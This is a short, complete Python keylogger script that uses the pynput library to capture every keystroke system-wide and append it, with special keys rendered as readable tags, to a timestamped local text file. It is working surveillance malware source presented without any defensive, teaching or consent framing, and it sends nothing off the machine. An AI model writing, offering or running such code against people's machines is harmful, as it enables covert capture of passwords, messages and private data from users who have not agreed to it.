from pynput.keyboard import Listener
from datetime import datetime

# Set up session-based filename
session_start = datetime.now().strftime('%Y-%m-%d_%H-%M-%S')
filename = f"keylog_{session_start}.txt"

def log_keystrokes(key):
    # Convert the key to a string and clean up
    key = str(key).replace("'", "")
    
    # Handle special keys
    if key == 'Key.space':
        key = ' '
    elif key == 'Key.enter':
        key = '\n'
    elif key == 'Key.backspace':
        key = '[BACKSPACE]'
    elif 'Key' in key:  # For other special keys like shift, ctrl, etc.
        key = f"[{key.split('.')[1].upper()}]"

    # Write the keystroke to the session-based log file
    with open(filename, 'a') as log_file:
        log_file.write(key)

# Start listening to keystrokes
with Listener(on_press=log_keystrokes) as listener:
    listener.join()
